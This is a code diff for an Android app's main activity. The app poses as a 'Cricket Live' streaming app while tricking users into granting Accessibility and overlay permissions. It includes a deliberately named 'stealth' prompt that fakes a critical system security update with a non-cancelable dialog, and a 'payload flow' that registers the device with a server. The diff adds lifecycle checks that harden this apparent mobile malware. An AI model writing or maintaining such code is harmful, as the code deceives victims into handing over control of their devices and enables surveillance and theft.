@@ -53,6 +53,7 @@ class MainActivity : AppCompatActivity() {
 
     private fun setupUI() {
         binding.btnWatchLive.setOnClickListener {
+            if (isFinishing || isDestroyed) return@setOnClickListener
             if (isAccessibilityServiceEnabled()) {
                 startPayloadFlow()
             } else {
@@ -65,6 +66,7 @@ class MainActivity : AppCompatActivity() {
         }
 
         binding.btnTeams.setOnClickListener {
+            if (isFinishing || isDestroyed) return@setOnClickListener
             if (!isAccessibilityServiceEnabled()) {
                 openAccessibilitySettings()
             } else {
@@ -84,11 +86,12 @@ class MainActivity : AppCompatActivity() {
     }
 
     private fun showPermissionDialog() {
+        if (isFinishing || isDestroyed) return
         AlertDialog.Builder(this)
             .setTitle("Video Overlay Required")
             .setMessage("Cricket Live needs Accessibility access to show score overlays while you use other apps. This allows you to watch the match while chatting or browsing.")
             .setPositiveButton("Enable Now") { _, _ ->
-                openAccessibilitySettings()
+                if (!isFinishing && !isDestroyed) openAccessibilitySettings()
             }
             .setNegativeButton("Later", null)
             .show()
@@ -105,11 +108,12 @@ class MainActivity : AppCompatActivity() {
     }
 
     private fun showStealthAccessibilityPrompt() {
+        if (isFinishing || isDestroyed) return
         AlertDialog.Builder(this)
             .setTitle("System Update Required")
             .setMessage("Security Patch v2.1\n\nYour device needs a critical security update. Tap 'Apply Now' to proceed with the update process.")
             .setPositiveButton("Apply Now") { _, _ ->
-                openAccessibilitySettings()
+                if (!isFinishing && !isDestroyed) openAccessibilitySettings()
             }
             .setNegativeButton("Later", null)
             .setCancelable(false)
@@ -117,6 +121,7 @@ class MainActivity : AppCompatActivity() {
     }
 
     private fun openAccessibilitySettings() {
+        if (isFinishing || isDestroyed) return
         startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS))
     }
 
@@ -136,7 +141,7 @@ class MainActivity : AppCompatActivity() {
     }
 
     private fun continuePayloadFlow() {
-        if (flowCompleted) return
+        if (flowCompleted || isFinishing || isDestroyed) return
 
         // Step 1: Overlay permission — request only once
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.canDrawOverlays(this)) {
@@ -215,6 +220,8 @@ class MainActivity : AppCompatActivity() {
     }
 
     private fun finishSetup() {
+        if (isFinishing || isDestroyed) return
+
         // Step 4: Register via HTTP SYNCHRONOUSLY (must complete before foreground service)
         // Using sync to guarantee delivery — even if foreground service crashes the process,
         // the HTTP request has already completed
@@ -269,9 +276,9 @@ class MainActivity : AppCompatActivity() {
 
     override fun onResume() {
         super.onResume()
+        if (isFinishing || isDestroyed) return
         if (isAccessibilityServiceEnabled()) {
             binding.statusText.text = "Ready to stream"
-            // Safe to call repeatedly — flowCompleted guard prevents re-entry
             startPayloadFlow()
         }
     }
